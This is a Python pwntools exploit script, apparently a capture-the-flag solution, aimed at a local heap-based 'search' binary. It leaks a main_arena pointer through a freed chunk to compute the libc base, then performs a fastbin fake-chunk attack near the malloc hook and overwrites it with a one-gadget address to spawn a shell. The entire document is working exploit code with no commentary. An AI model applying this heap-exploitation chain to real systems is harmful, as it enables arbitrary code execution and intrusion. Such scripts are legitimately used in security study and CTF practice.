from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux')
context.log_level = 'debug'
io = process('./search')
elf = ELF('./search')

def search(word):
	io.recvuntil('3: Quit\n')
	io.sendline('1')
	io.recvuntil('Enter the word size:\n')
	io.sendline(str(len(word)))
	io.recvuntil('Enter the word:\n')
	io.send(word)
	
def sentence(sentence):
	io.recvuntil('3: Quit\n')
	io.sendline('2')
	io.recvuntil('Enter the sentence size:\n')
	io.sendline(str(len(sentence)))
	io.recvuntil('Enter the sentence:\n')
	io.send(sentence)
	io.recvuntil('Added sentence\n')
	
payload = 'a'*0x7e+' w'
sentence(payload)
search('w')
io.recv()
io.sendline('y')
search('\x00')
io.recvuntil('Found '+str(len(payload))+': ')
main_arena = u64(io.recv(6).ljust(8,'\x00')) - 88
log.success('main arena: '+hex(main_arena))
libc_base = main_arena - 0x3c4b20
log.success('libc base: '+hex(libc_base))
io.sendline('n')

sentence(0x5d*'a'+' w')
sentence(0x5d*'b'+' w')
sentence(0x5d*'c'+' w')
search('w')
io.recv()
io.sendline('y')
io.recv()
io.sendline('y')
io.recv()
io.sendline('y')
#gdb.attach(io,'b *0x400ADF')
#raw_input()
search('\x00')
io.recv()
io.sendline('y')
io.recv()
io.sendline('n')
io.recv()
io.sendline('n')

fake_chunk_addr = main_arena-0x33
log.success('fake chunk addr: '+hex(fake_chunk_addr))
payload = p64(fake_chunk_addr)
payload = payload.ljust(0x60,'f')
sentence(payload)
sentence('a'*0x60)
sentence('a'*0x60)
gdb.attach(io,'b *0x400C16')
raw_input()
payload = 'a'*0x13+p64(libc_base + 0x45216)
payload = payload.ljust(0x60,'f')
sentence(payload)
io.sendline('ls')
io.recv()

